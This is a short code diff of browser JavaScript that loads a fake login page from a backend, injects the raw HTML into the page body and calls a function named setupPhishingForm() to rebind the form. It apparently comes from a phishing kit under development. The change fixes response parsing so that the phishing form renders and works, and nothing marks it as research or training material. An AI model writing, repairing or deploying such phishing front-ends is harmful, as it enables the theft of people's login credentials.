@@ -21,21 +21,18 @@
    
    // STEP 1: Get the fresh token and HTML from our backend
    fetch('/api/get-login-page')
-     .then(res => res.json())
+     .then(res => res.text()) // Changed from .json() to .text()
      .then(data => {
-      console.log("API Response received:", data);
-       // Inject the fresh HTML into the body
-       console.log("Injecting HTML into body now...");
-       document.body.innerHTML = data.html;
-       
-       // Re-bind events since we replaced the DOM
+       console.log("API Response received (Raw HTML):", data);
+       document.body.innerHTML = data; // Use 'data' directly, NOT 'data.html'
        setupPhishingForm();
        console.log("Form events re-bound successfully.");
      })
      .catch(err => {
        console.error("Failed to load login page", err);
-       alert("Error loading page. Check console.");
+       alert("Error loading page.");
      });
+
 
  });
 
